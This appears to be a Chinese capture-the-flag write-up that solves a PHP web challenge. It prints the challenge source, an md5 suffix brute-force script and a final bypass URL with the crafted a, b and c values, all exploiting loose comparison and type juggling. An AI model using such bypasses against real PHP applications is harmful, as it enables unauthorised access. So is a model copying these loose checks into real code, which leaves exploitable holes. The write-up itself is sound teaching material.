感觉主要是对于php一些常见函数的绕过

主要区分的是==和===

==会发生强制类型转换，而===要求比较类型和值

源代码如下：

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}
```



发现需要构造a和b和c

构造a就要用e了，注意url传递字符串不用“”

b的话用一个python脚本便可以构造成功（问就是撞库）

```python
import hashlib

target_suffix = "8b184b"

# 循环生成字符串并计算哈希值
i = 0
while True:
    # 构造字符串
    string = str(i)
    # 计算哈希值
    hash_value = hashlib.md5(string.encode()).hexdigest()
    # 提取哈希值的后六位
    suffix = hash_value[-6:]
    # 检查是否符合条件
    if suffix == target_suffix:
        break
    i += 1

print("生成的字符串:", string)
print("对应的哈希值:", hash_value)
```

c的话就是一个json序列化问题

然后关键在于array_search()比较为==问题，用0和"DGGJ"比较就可

最后的payload

http://61.147.171.105:56575/?a=1e8&b=53724&c={%22m%22:%222023a%22,%22n%22:[[1,2],0]}